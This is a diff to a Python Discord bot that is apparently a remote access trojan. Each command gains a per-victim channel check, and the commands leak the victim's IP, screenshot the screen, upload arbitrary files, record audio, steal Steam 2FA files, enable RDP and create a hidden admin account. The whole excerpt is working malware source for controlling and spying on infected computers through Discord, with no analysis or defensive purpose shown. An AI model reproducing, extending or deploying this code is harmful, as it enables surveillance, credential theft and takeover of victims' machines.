@@ -43,10 +43,16 @@ def main():
 
     @bot.command()
     async def dox(ctx):
+        if ctx.channel.name != generate_uuid():
+            return
+
         await ctx.send(ip)
 
     @bot.command()
     async def mouse(ctx, freeze_time):
+        if ctx.channel.name != generate_uuid():
+            return
+
         result, fixed_time = time_prep(freeze_time)
         if result:
             await ctx.send(f"Freezing mouse for {fixed_time} seconds")
@@ -57,12 +63,18 @@ def main():
 
     @bot.command()
     async def screen(ctx):
+        if ctx.channel.name != generate_uuid():
+            return
+            
         screen_path = screenshot()
         await ctx.send(file=discord.File(screen_path))
         os.remove(screen_path)
 
     @bot.command()
     async def download(ctx, path):
+        if ctx.channel.name != generate_uuid():
+            return
+
         if osp.exists(path):
             await ctx.send(file=discord.File(path))
         else:
@@ -70,6 +82,9 @@ def main():
 
     @bot.command()
     async def record(ctx, record_time):
+        if ctx.channel.name != generate_uuid():
+            return
+
         result, fixed_time = time_prep(record_time)
         if result:
             await ctx.send(f"Recording audio for {fixed_time} seconds")
@@ -84,11 +99,17 @@ def main():
     # to implement thread handling
     @bot.command()
     async def disconnect(ctx):
+        if ctx.channel.name != generate_uuid():
+            return
+
         await ctx.send("Closing bot...")
         exit(0)
 
     @bot.command()
     async def safe_disconnect(ctx):
+        if ctx.channel.name != generate_uuid():
+            return
+
         await ctx.send("Safe exit... (This might take a while)")
         for thread in threads:
             thread.join()
@@ -96,6 +117,9 @@ def main():
         
     @bot.command()
     async def getSteam2fa(ctx):
+        if ctx.channel.name != generate_uuid():
+            return
+
         for file in getSteamFils():
             if osp.exists(file):
                 await ctx.send(f"Uploading file...")
@@ -105,11 +129,17 @@ def main():
 
     @bot.command()
     async def rdp_enable(ctx):
+        if ctx.channel.name != generate_uuid():
+            return
+
         if enable_rdp_on_target():
             await ctx.send("Enabled RDP on target")
 
     @bot.command()
     async def create_admin_user(ctx):
+        if ctx.channel.name != generate_uuid():
+            return
+
         username = create_user_account_on_target()
         if username:
             await ctx.send("Created user on target")
